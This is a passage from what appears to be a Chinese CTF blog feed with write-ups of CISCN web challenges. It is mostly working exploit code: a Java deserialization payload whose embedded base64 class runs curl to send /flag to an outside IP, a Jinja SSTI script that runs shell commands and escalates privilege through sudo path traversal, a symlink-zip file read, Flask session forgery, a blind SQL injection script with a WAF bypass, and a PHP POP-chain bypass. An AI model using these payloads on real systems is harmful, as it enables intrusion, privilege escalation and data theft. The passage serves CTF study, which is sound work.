Deserializer.deserialize(oldCartStr);</span><br><span class="hljs-comment">//        Map skuDescribe = test.getSkuDescribe();</span><br><span class="hljs-comment">//        System.out.println(skuDescribe.getClass().getName());</span><br><br>        <span class="hljs-keyword">return</span> oldCartStr;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">getData</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NotFoundException, CannotCompileException </span>&#123;<br>        String fileName = <span class="hljs-string">&quot;Evil.class&quot;</span>;<br>        <span class="hljs-keyword">byte</span>[] exp = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br><span class="hljs-comment">//        String content = &quot;yv66vgAAADQALQoACwAYCgAZABoIABsKABkAHAcAHQgAHggAHwgAIAoAGQAhBwAiBwAjBwAkAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHACUBAApyZWFkT2JqZWN0AQAeKExqYXZhL2lvL09iamVjdElucHV0U3RyZWFtOylWBwAmAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADQAOBwAnDAAoACkBAAhjYWxjLmV4ZQwAKgArAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwEALWN1cmwgaHR0cDovLzM5LjEwNy4yMzkuMzA6MjMzMyAtRiBmaWxlPUAvZmxhZwwAKgAsAQAERXZpbAEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAKAAsAAQAMAAAAAgABAA0ADgACAA8AAAAhAAEAAQAAAAUqtwABsQAAAAEAEAAAAAoAAgAAAAUABAAHABEAAAAEAAEAEgACABMAFAACAA8AAABEAAUAAgAAACS4AAISA7YABFe4AAIGvQAFWQMSBlNZBBIHU1kFEghTtgAJV7EAAAABABAAAAAOAAMAAAAJAAkACwAjAAwAEQAAAAQAAQAVAAEAFgAAAAIAFw==&quot;;</span><br><span class="hljs-comment">//        byte[] exp = Base64.getDecoder().decode(content);</span><br>        Cart cart = <span class="hljs-keyword">new</span> Cart();<br>        Map&lt;String,Object&gt; skuDescribe = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        skuDescribe.put(fileName,exp);<br>        cart.setSkuDescribe(skuDescribe);<br><br>        String payload = Deserializer.serialize(cart);<br>        Cart test = (Cart) Deserializer.deserialize(payload);<br>        <span class="hljs-keyword">for</span>(Map.Entry&lt;String,Object&gt; entry:test.getSkuDescribe().entrySet())&#123;<br><span class="hljs-comment">//            skuDescribe.put(entry.getKey(),entry.getValue());</span><br>            System.out.println(entry.getKey());<br>            System.out.println(entry.getValue());<br>        &#125;<br>        <span class="hljs-keyword">return</span> payload;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">(String skus, String oldCartStr)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        CartServiceImpl.getInstance().addToCart(skus,oldCartStr);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception</span>&#123;<br>        String skus = getData();<br>        String Cookie = getCookie();<br>        System.out.println(<span class="hljs-string">&quot;String skus =  &quot;</span> + skus);<br>        System.out.println(<span class="hljs-string">&quot;String Cookie =  &quot;</span> + Cookie);<br>        test(skus,Cookie);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>target/classes下写入Evil.class,然后反序列化这个类即可<br><img src="https://img-blog.csdnimg.cn/2c529813fc7c44ad9e7fa1db828f1eb9.png" alt="在这里插入图片描述"><br>发送请求<br><img src="https://img-blog.csdnimg.cn/1e38a8465ebb4fa6b0029e527eb49b1f.png" alt="在这里插入图片描述"></p><h3 id="Patch修复"><a href="#Patch修复" class="headerlink" title="Patch修复"></a>Patch修复</h3><p>buu上环境有点问题回头再看看。</p><h2 id="easy-python"><a href="#easy-python" class="headerlink" title="easy_python"></a>easy_python</h2><p>有点脑洞和套娃，不过那个提权也不算老套感觉。</p><p>参考文档。步骤有些繁琐，不过很容易看懂。<br><a href="https://inhann.top/2021/07/22/ciscn2021_easypython/">wp1</a><br><a href="https://www.wolai.com/atao/hf4yLDPzB1rq471j4HMXDe">wp2</a></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br><span class="hljs-comment"># url = &quot;http://node4.buuoj.cn:27858/&#123;% print() %&#125;&quot;</span><br><span class="hljs-comment"># url = &quot;http://127.0.0.1:3333/&#123;&#123;dict(hello=a)|slice(dict(aa=a)|lower|list|count-dict(a=a)|lower|list|count)|first|first&#125;&#125;&quot;</span><br>url = <span class="hljs-string">&#x27;&#x27;&#x27;http://node4.buuoj.cn:27858/&#123;%set z=request.args%&#125;&#123;% set p=x.__init__.__globals__[z.a] %&#125;&#123;% print(p.eval(z.b))%&#125;&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># &#123;&#123;dict(hello=a)|slice(1)|first|first&#125;&#125;</span><br>s = requests.session()<br><br>flag = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;#!/bin/bash\ncat /flag.txt\n&quot;</span> , <span class="hljs-string">&quot;utf-8&quot;</span>)<br>b = b64encode(b64encode(flag))<br>cmd1 = <span class="hljs-string">&quot;echo &#123;&#125; &gt; cmd.sh&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">bytes</span>.decode(b,<span class="hljs-string">&quot;utf-8&quot;</span>))<br>cmd2 = <span class="hljs-string">&quot;base64 -d cmd.sh &gt; cmd1.sh&quot;</span><br>cmd3 = <span class="hljs-string">&quot;base64 -d cmd1.sh &gt; cmd.sh&quot;</span><br>cmd4 = <span class="hljs-string">&quot;chmod 777 cmd.sh&quot;</span><br>cmd5 = <span class="hljs-string">&quot;sudo -u dragon_lord /usr/sbin/service ../../var/www/cmd.sh&quot;</span><br>cmd6 = <span class="hljs-string">&quot;rm cmd1.sh&quot;</span><br>cmd7 = <span class="hljs-string">&quot;rm cmd.sh&quot;</span><br>cmd8 = <span class="hljs-string">&quot;cat /var/www/cmd.sh&quot;</span><br>cmds = [<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;cmd&quot;</span>+<span class="hljs-built_in">str</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cmds:<br>    params=&#123;<br>        <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;__builtins__&quot;</span>,<br>        <span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-string">&#x27;&#x27;&#x27;__import__(&quot;imp&quot;).load_source(&#x27;mymod&#x27;, &#x27;/usr/local/lib/python3.9/subprocess.py&#x27;).Popen(&quot;&#123;&#125;&quot;,shell=True,stdout=-1).stdout.read()&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(i)<br>    &#125;<br>    res = s.get(url,params=params)<br>    <span class="hljs-built_in">print</span>(html.unescape(res.text))<br>    <span class="hljs-built_in">print</span>(res.url)<br><br><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/a54be8885c1eeede143315f4048bddca.png"></p><h3 id="Patch修复-1"><a href="#Patch修复-1" class="headerlink" title="Patch修复"></a>Patch修复</h3><h2 id="babypython"><a href="#babypython" class="headerlink" title="babypython"></a>babypython</h2><p>软链接任意文件读取.<br><a href="https://www.vuln.cn/8132">参考</a></p><p>首先需要读取mac地址<br><img src="https://img-blog.csdnimg.cn/img_convert/47c82bbd88878a29887f9133800ac56e.png"></p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">ln -si <span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>eth0/address link<br>zip --symlinks <span class="hljs-number">1</span>.zip link<br></code></pre></div></td></tr></table></figure><p>然后伪造cookie即可</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-comment"># 1.4145912447929843</span><br><span class="hljs-comment"># random.seed(uuid.getnode())</span><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&quot;1.4145912447929843&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>        session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">u&#x27;admin&#x27;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment">#app.run(debug=True)</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">False</span>, port=<span class="hljs-number">3333</span>)<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/c3822f309322cc664d223fff17bcbf33.png"></p><h3 id="Patch修复-2"><a href="#Patch修复-2" class="headerlink" title="Patch修复"></a>Patch修复</h3><h2 id="iiNote"><a href="#iiNote" class="headerlink" title="iiNote"></a>iiNote</h2>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN 2022初赛</title>
    <link href="/2022/07/24/2022-7-24-CISCN%202022%E5%88%9D%E8%B5%9B/"/>
    <url>/2022/07/24/2022-7-24-CISCN%202022%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN-2022初赛"><a href="#CISCN-2022初赛" class="headerlink" title="CISCN 2022初赛"></a>CISCN 2022初赛</h1><p>[toc]</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Ezpentest（赛后复现）"><a href="#Ezpentest（赛后复现）" class="headerlink" title="Ezpentest（赛后复现）"></a>Ezpentest（赛后复现）</h3><p>这个题把黑名单当作hint藏着，想要提高难度也不至于这样提高吧。<br>题目后来给出的waf：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-variable">$r</span> = preg_replace(<span class="hljs-string">&#x27;/[\s,()#;*~\-]/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);<br>    <span class="hljs-variable">$r</span> = preg_replace(<span class="hljs-string">&#x27;/^.*(?=union|binary|regexp|rlike).*$/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$r</span>);<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$r</span>;<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>首先是sql注入，payload和虎符ctf的做法差不多，改改就行了。</p><ul><li><p>利用like去正则匹配password这一列的数据，如果匹配到就返回9223372036854775807+1 这个表达式，而这个表示执行后会导致数据溢出，服务器会报500，否则就返回’0’，服务器会报error</p></li><li><p>+’’是因为过滤了空白符号，所以用来连接起sql语句的，这里的数据溢出同样可以用18446744073709551615+1，这个18446744073709551615的值其实就是<code>~0</code>,也就是说这个payload就是~0+1</p></li><li><p>utf8mb4_bin是用来区分大小写的，因为like正则匹配是不区分大小写的</p></li><li><p>case用来解决优先级问题</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding: utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>payload=<span class="hljs-string">&quot;0&#x27;||case&#x27;1&#x27;when`username`collate&#x27;utf8mb4_bin&#x27;like&#x27;&#123;&#125;%&#x27;then+9223372036854775807+1+&#x27;&#x27;else&#x27;0&#x27;end||&#x27;&quot;</span><br><br><span class="hljs-comment">#这里过滤了取反，所以要用9223372036854775807+1这个也可以18446744073709551615+1来代替溢出</span><br><span class="hljs-built_in">list</span> = string.ascii_letters + string.digits + <span class="hljs-string">&#x27;^$!_%@&amp;&#x27;</span><br><br>url = <span class="hljs-string">&#x27;http://1.14.71.254:28029/login.php&#x27;</span><br>j=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>        <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;%_&#x27;</span>):  <span class="hljs-comment">#这里是对like正则匹配中的一些特殊符号进行转义，这里很重要，不然注出来的结果都不行。</span><br>            i = <span class="hljs-string">&quot;\\&quot;</span> + i<br>        now_payload=payload.<span class="hljs-built_in">format</span>(j+i)<br>        data=&#123;<br>        <span class="hljs-string">&#x27;password&#x27;</span>: now_payload,<br>        <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;aaa&#x27;</span><br>        &#125;<br>        re = requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span>  re.status_code==<span class="hljs-number">500</span>:<br>            j+=i<br>            <span class="hljs-built_in">print</span>(j)<br>            <span class="hljs-keyword">break</span><br>            <br><span class="hljs-comment"># 最后得到的账号密码</span><br><span class="hljs-comment"># nssctfwabbybaboo!@$%!!</span><br><span class="hljs-comment"># PAssw40d_Y0u3_Never_Konwn!@!!</span><br></code></pre></div></td></tr></table></figure><p>登录之后提示<code>/1Nd3x_Y0u_N3v3R_Kn0W.php</code>，给了SomeClass.php反序列化源码。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">see</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-keyword">$this</span>-&gt;b;<br>        <span class="hljs-variable">$checker</span> = <span class="hljs-keyword">new</span> ReflectionClass(get_class(<span class="hljs-variable">$b</span>));<br>        <span class="hljs-keyword">if</span>(basename(<span class="hljs-variable">$checker</span>-&gt;getFileName()) != <span class="hljs-string">&#x27;SomeClass.php&#x27;</span>)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>-&gt;a)&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>-&gt;b))&#123;<br>                (<span class="hljs-variable">$b</span>-&gt;a)(<span class="hljs-variable">$b</span>-&gt;b.<span class="hljs-string">&quot;&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;a-&gt;see();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;a-&gt;read();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;lock lock read!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;b-&gt;learn();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;a = <span class="hljs-keyword">$this</span>-&gt;b.<span class="hljs-string">&quot; Powered by PHP&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-comment">//eval($this-&gt;a); ??? 吓得我赶紧把后门注释了</span><br>        <span class="hljs-comment">//echo &quot;???&quot;;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-keyword">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$t1</span>,<span class="hljs-variable">$t2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$s1</span> = <span class="hljs-keyword">$this</span>-&gt;b;<br>        <span class="hljs-variable">$s1</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>并且登录之后可以看到还有一段用PHPJiaMi混淆的代码。<br><code>https://github.com/wenshui2008/phpjiami_decode</code><br>利用curl下载混淆的代码保存为php文件。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">1.14</span>.<span class="hljs-number">71.254</span>:<span class="hljs-number">28029</span><span class="hljs-regexp">/login.php --cookie &quot;PHPSESSID=b9ce132a83f74b050ce8583ab371a964&quot; -o ./</span><span class="hljs-number">1</span>.php<br></code></pre></div></td></tr></table></figure><p>利用工具解混淆，得到另一段源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Al</span>(<span class="hljs-params"><span class="hljs-variable">$classname</span></span>)</span>&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$classname</span>.<span class="hljs-string">&quot;.php&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$o</span> = unserialize(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$o</span> === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Error Format&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        spl_autoload_register(<span class="hljs-string">&#x27;Al&#x27;</span>);<br>        <span class="hljs-variable">$o</span> = unserialize(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$raw</span> = serialize(<span class="hljs-variable">$o</span>);<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/Some/i&quot;</span>,<span class="hljs-variable">$raw</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;Error&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$o</span> = unserialize(<span class="hljs-variable">$raw</span>);<br>        var_dump(<span class="hljs-variable">$o</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;SomeClass.php&quot;</span>);<br>&#125;<br> <br></code></pre></div></td></tr></table></figure><p>反序列化中的链子很简单<code>E::__destruct()-&gt;B::__toString()-&gt;A::see()</code>但是最后rce的地方限制了类名，找个php原生类就行了，例如Error，ArrayObject等。但是还需要绕过<code>throw new Error(&quot;Error&quot;);</code>对于包含反序列化文件<code>SomeClass.php</code>的限制。<br>有两种方法可以绕过。<br><a href="https://hackerqwq.github.io/2021/08/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8BFast-Destruct/">PHP反序列化小技巧之Fast Destruct</a></p></li><li><p>利用__PHP_Incomplete_Class绕过正则，形如<code>a:1:&#123;i:1;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:2:&quot;aa&quot;;a:0:&#123;&#125;&#125;&#125;&#125;</code></p></li><li><p>利用fast_destrust提前进入destrust。我们可以两种做法，第一种是删除最后的大括号，第二种是数组对象占用指针（改数字）。但是这里有对序列化数据格式正确与否进行校验所以无法使用第一种。</p></li></ul><p>第一种方法</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SomeClass</span></span><br><span 